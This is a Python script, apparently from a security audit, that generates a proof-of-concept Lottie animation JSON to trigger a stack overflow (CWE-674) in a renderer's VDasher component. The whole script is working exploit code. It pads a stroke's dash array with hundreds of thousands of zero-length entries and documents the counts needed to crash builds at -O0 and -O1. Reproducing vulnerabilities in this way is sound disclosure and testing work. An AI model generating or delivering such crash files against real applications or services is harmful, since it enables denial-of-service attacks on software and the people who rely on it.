#!/usr/bin/env python3
"""Generate PoC for CWE-674: VDasher stack overflow via zero-length dash entries.

Minimum entries for crash:
  -O0, 8MB stack: ~300,000 zero entries (~10 MB JSON)
  -O1, 8MB stack: ~1,000,000 zero entries (~35 MB JSON)
  -O2+: tail-call optimized to loop, no stack overflow

Usage:
  python3 gen_finding1_dasher_poc.py [num_zero_entries]
  # Default: 300000 (sufficient for -O0 with 8MB stack)
"""
import json
import sys

NUM_ZERO_ENTRIES = int(sys.argv[1]) if len(sys.argv) > 1 else 300000

dash_array = [
    {"v": {"a": 0, "k": 5}, "n": "d"},
    {"v": {"a": 0, "k": 5}, "n": "g"},
]
for _ in range(NUM_ZERO_ENTRIES):
    dash_array.append({"v": {"a": 0, "k": 0}, "n": "d"})
dash_array.append({"v": {"a": 0, "k": 0}, "n": "o"})

animation = {
    "v": "5.5.2", "fr": 30, "ip": 0, "op": 2, "w": 100, "h": 100,
    "layers": [{
        "ty": 4, "ip": 0, "op": 2, "st": 0, "sr": 1,
        "ks": {
            "o": {"a": 0, "k": 100}, "r": {"a": 0, "k": 0},
            "p": {"a": 0, "k": [50, 50]}, "a": {"a": 0, "k": [0, 0]},
            "s": {"a": 0, "k": [100, 100]}
        },
        "shapes": [
            {"ty": "sh", "ks": {"a": 0, "k": {
                "v": [[0, 0], [50, 0], [100, 50]],
                "i": [[0, 0], [0, 0], [0, 0]],
                "o": [[0, 0], [0, 0], [0, 0]],
                "c": False
            }}},
            {"ty": "st", "c": {"a": 0, "k": [1, 0, 0, 1]},
             "o": {"a": 0, "k": 100}, "w": {"a": 0, "k": 2},
             "lc": 2, "lj": 2,
             "d": dash_array}
        ]
    }]
}

outfile = "finding1_dasher_stack_overflow.json"
with open(outfile, "w") as f:
    json.dump(animation, f)

print(f"Generated {outfile}: {NUM_ZERO_ENTRIES} zero dash entries")
